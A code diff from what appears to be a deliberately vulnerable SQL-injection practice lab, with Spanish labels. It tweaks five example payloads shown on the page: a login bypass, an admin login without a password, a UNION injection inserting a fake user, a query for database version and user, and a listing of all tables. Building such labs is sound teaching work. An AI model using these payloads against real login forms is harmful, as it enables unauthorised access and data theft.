@@ -187,13 +187,13 @@ if (isset($_SESSION['vulnerable_user'])) {
                         
                         <div class="payload-example p-3 mb-3 rounded">
                             <strong>1. Bypass de autenticación:</strong><br>
-                            <code>' OR '1'='1' --</code><br>
+                            <code>' OR '1'='1' -- '</code><br>
                             <small class="text-muted">Inicia sesión sin contraseña válida</small>
                         </div>
                         
                         <div class="payload-example p-3 mb-3 rounded">
                             <strong>2. Login como admin específico:</strong><br>
-                            <code>admin' --</code><br>
+                            <code>admin' -- '</code><br>
                             <small class="text-muted">Accede como admin sin contraseña</small>
                         </div>
                         
@@ -205,19 +205,19 @@ if (isset($_SESSION['vulnerable_user'])) {
                         
                         <div class="payload-example p-3 mb-3 rounded">
                             <strong>3. UNION injection (estructura simple):</strong><br>
-                            <code>' UNION SELECT 1,'admin','secreto' --</code><br>
+                            <code>' UNION SELECT 1,'admin','secreto' -- '</code><br>
                             <small class="text-muted">Inyecta usuario falso con 3 campos</small>
                         </div>
                         
                         <div class="payload-example p-3 mb-3 rounded">
                             <strong>4. Información del sistema:</strong><br>
-                            <code>' UNION SELECT database(),user(),version() --</code><br>
+                            <code>' UNION SELECT database(),user(),version() -- '</code><br>
                             <small class="text-muted">Obtiene info de la base de datos</small>
                         </div>
                         
                         <div class="payload-example p-3 mb-3 rounded">
                             <strong>5. Listar tablas:</strong><br>
-                            <code>' UNION SELECT 1,table_name,3 FROM information_schema.tables --</code><br>
+                            <code>' UNION SELECT 1,table_name,3 FROM information_schema.tables -- '</code><br>
                             <small class="text-muted">Muestra todas las tablas de la BD</small>
                         </div>
                         
